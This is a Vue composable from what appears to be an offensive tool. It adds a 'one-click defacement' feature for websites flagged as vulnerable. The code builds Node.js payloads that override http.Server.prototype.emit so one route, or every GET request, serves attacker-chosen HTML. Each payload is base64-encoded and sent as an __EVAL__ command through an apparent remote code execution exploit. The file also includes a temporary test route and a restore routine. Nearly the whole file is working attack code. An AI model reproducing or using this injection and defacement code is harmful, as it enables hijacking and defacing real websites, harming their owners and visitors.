/**
 * POC 一键挂黑功能 Composable
 * 负责页面劫持、注入、恢复等功能
 */
import { ref, nextTick, watch } from 'vue'

// Base64 编码函数
const base64Encode = (str) => {
  return btoa(unescape(encodeURIComponent(str)))
}

// 防抖函数
const debounce = (fn, delay) => {
  let timer = null
  return function (...args) {
    if (timer) clearTimeout(timer)
    timer = setTimeout(() => fn.apply(this, args), delay)
  }
}

export function usePocHijack() {
  const hijackRouteMode = ref('specific')
  const hijackTargetRoute = ref('/')
  const isHijacking = ref(false)
  const isRestoring = ref(false)
  const hijackEditorContainer = ref(null)
  const showHijackInjectDialog = ref(false)
  const showHijackPreviewDialog = ref(false)
  const showHijackRestoreDialog = ref(false)
  let hijackEditor = null

  const getDefaultHijackHtml = () => {
    return `<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>网站维护中</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
        }
        .container {
            text-align: center;
            padding: 40px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
        }
        h1 { font-size: 48px; margin-bottom: 20px; }
        p { font-size: 18px; opacity: 0.9; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🚧 网站维护中</h1>
        <p>我们正在进行系统升级，请稍后再访问</p>
    </div>
</body>
</html>`
  }

  const hijackHtmlContent = ref(getDefaultHijackHtml())

  // 加载缓存的挂黑代码
  const loadCachedHijackHtml = async () => {
    try {
      const result = await window.api.storage.loadSettings()
      if (result.success && result.settings?.hijackHtmlCache) {
        hijackHtmlContent.value = result.settings.hijackHtmlCache
        console.log('✅ 已加载缓存的挂黑代码')
      }
    } catch (error) {
      console.error('加载挂黑代码缓存失败:', error)
    }
  }

  // 保存挂黑代码到缓存（防抖）
  const saveCachedHijackHtml = debounce(async (html) => {
    try {
      const result = await window.api.storage.loadSettings()
      if (result.success) {
        const settings = result.settings || {}
        settings.hijackHtmlCache = html
        await window.api.storage.saveSettings(settings)
        console.log('💾 挂黑代码已缓存')
      }
    } catch (error) {
      console.error('保存挂黑代码缓存失败:', error)
    }
  }, 1000)

  // 监听内容变化，自动保存
  watch(hijackHtmlContent, (newHtml) => {
    if (newHtml && newHtml !== getDefaultHijackHtml()) {
      saveCachedHijackHtml(newHtml)
    }
  })

  // 初始化时加载缓存
  loadCachedHijackHtml()

  // 生成劫持代码
  const generateHijackCode = (route, html) => {
    const escapedHtml = html.replace(/\\/g, '\\\\').replace(/`/g, '\\`').replace(/\$/g, '\\$')

    if (route === '*') {
      // 全局劫持
      return `(async()=>{const h=await import('node:http');const u=await import('node:url');if(!global.__originalEmit){global.__originalEmit=h.Server.prototype.emit;}h.Server.prototype.emit=function(e,...a){if(e==='request'){const[q,s]=a;const p=u.parse(q.url,true);if(q.method==='GET'){s.writeHead(200,{'Content-Type':'text/html; charset=utf-8'});s.end(\`${escapedHtml}\`);return true;}}return global.__originalEmit.apply(this,arguments);};})();`
    } else {
      // 指定路由劫持
      return `(async()=>{const h=await import('node:http');const u=await import('node:url');if(!global.__originalEmit){global.__originalEmit=h.Server.prototype.emit;}if(!global.__hijackRoutes){global.__hijackRoutes=new Map();}global.__hijackRoutes.set('${route}',\`${escapedHtml}\`);h.Server.prototype.emit=function(e,...a){if(e==='request'){const[q,s]=a;const p=u.parse(q.url,true);if(q.method==='GET'&&global.__hijackRoutes.has(p.pathname)){s.writeHead(200,{'Content-Type':'text/html; charset=utf-8'});s.end(global.__hijackRoutes.get(p.pathname));return true;}}return global.__originalEmit.apply(this,arguments);};})();`
    }
  }

  // 显示注入对话框
  const showInjectDialog = (url, isVulnerable, showSnackbar) => {
    if (!url) {
      showSnackbar('请输入目标URL', 'warning')
      return
    }

    if (!isVulnerable) {
      showSnackbar('目标不存在漏洞，无法注入', 'error')
      return
    }

    showHijackInjectDialog.value = true
  }

  // 确认注入
  const confirmInjectHijack = async (url, showSnackbar) => {
    isHijacking.value = true

    try {
      const route = hijackRouteMode.value === 'global' ? '*' : hijackTargetRoute.value
      const html = hijackHtmlContent.value

      const hijackCode = generateHijackCode(route, html)
      const base64Code = base64Encode(hijackCode)
      const command = `__EVAL__:${base64Code}`

      const result = await window.api.executePOC(url, command)

      if (result.success && result.data.is_vulnerable) {
        showHijackInjectDialog.value = false
        showSnackbar('挂黑代码注入成功！', 'success')
      } else {
        showSnackbar('注入失败: ' + (result.error || '未知错误'), 'error')
      }
    } catch (error) {
      showSnackbar('注入错误: ' + error.message, 'error')
    } finally {
      isHijacking.value = false
    }
  }

  // 预览挂黑页面
  const previewHijack = () => {
    showHijackPreviewDialog.value = true
  }

  // 测试挂黑
  const testHijack = async (url, isVulnerable, showSnackbar) => {
    if (!url) {
      showSnackbar('请输入目标URL', 'warning')
      return
    }

    if (!isVulnerable) {
      showSnackbar('目标不存在漏洞，无法测试', 'error')
      return
    }

    if (!hijackHtmlContent.value.trim()) {
      showSnackbar('请先编写页面内容', 'warning')
      return
    }

    // 生成随机路由
    const randomRoute = '/_test_' + Math.random().toString(36).substring(2, 15)
    const html = hijackHtmlContent.value

    showSnackbar('正在注入临时测试路由...', 'info')

    try {
      const hijackCode = generateHijackCode(randomRoute, html)
      const base64Code = base64Encode(hijackCode)
      const command = `__EVAL__:${base64Code}`

      const result = await window.api.executePOC(url, command)

      if (result.success && result.data.is_vulnerable) {
        const testUrl = url + randomRoute

        setTimeout(() => {
          if (window.api?.openExternal) {
            window.api.openExternal(testUrl)
          } else {
            window.open(testUrl, '_blank')
          }
          showSnackbar('临时测试路由已打开: ' + randomRoute, 'success')
        }, 500)
      } else {
        showSnackbar('注入临时路由失败', 'error')
      }
    } catch (error) {
      showSnackbar('测试错误: ' + error.message, 'error')
    }
  }

  // 显示恢复对话框
  const showRestoreDialog = (url, isVulnerable, showSnackbar) => {
    if (!url) {
      showSnackbar('请输入目标URL', 'warning')
      return
    }

    if (!isVulnerable) {
      showSnackbar('目标不存在漏洞，无法恢复', 'error')
      return
    }

    showHijackRestoreDialog.value = true
  }

  // 确认恢复
  const confirmRestoreHijack = async (url, showSnackbar) => {
    isRestoring.value = true

    try {
      const restoreCode = `(async()=>{const h=await import('node:http');if(global.__originalEmit){h.Server.prototype.emit=global.__originalEmit;delete global.__originalEmit;}if(global.__hijackRoutes){delete global.__hijackRoutes;}})();`
      const base64Code = base64Encode(restoreCode)
      const command = `__EVAL__:${base64Code}`

      const result = await window.api.executePOC(url, command)

      if (result.success && result.data.is_vulnerable) {
        showHijackRestoreDialog.value = false
        showSnackbar('网站路由已恢复正常！', 'success')
      } else {
        showSnackbar('恢复失败: ' + (result.error || '未知错误'), 'error')
      }
    } catch (error) {
      showSnackbar('恢复错误: ' + error.message, 'error')
    } finally {
      isRestoring.value = false
    }
  }

  // 初始化挂黑编辑器
  const initHijackEditor = async () => {
    if (!hijackEditorContainer.value || hijackEditor) return

    await nextTick()

    // 确保加载了缓存的内容
    await loadCachedHijackHtml()

    const monaco = await import('monaco-editor')
    hijackEditor = monaco.editor.create(hijackEditorContainer.value, {
      value: hijackHtmlContent.value,
      language: 'html',
      theme: 'vs',
      automaticLayout: true,
      minimap: { enabled: false },
      fontSize: 14,
      lineNumbers: 'on',
      scrollBeyondLastLine: false,
      wordWrap: 'on',
      padding: { top: 16, bottom: 16 }
    })

    // 监听编辑器内容变化
    hijackEditor.onDidChangeModelContent(() => {
      const newContent = hijackEditor.getValue()
      hijackHtmlContent.value = newContent
    })
  }

  // 清理编辑器
  const cleanup = () => {
    if (hijackEditor) {
      try {
        hijackEditor.dispose()
      } catch (e) {
        console.error('销毁挂黑编辑器失败:', e)
      }
      hijackEditor = null
    }
  }

  return {
    hijackRouteMode,
    hijackTargetRoute,
    isHijacking,
    isRestoring,
    hijackEditorContainer,
    showHijackInjectDialog,
    showHijackPreviewDialog,
    showHijackRestoreDialog,
    hijackHtmlContent,
    showInjectDialog,
    confirmInjectHijack,
    previewHijack,
    testHijack,
    showRestoreDialog,
    confirmRestoreHijack,
    initHijackEditor,
    cleanup
  }
}
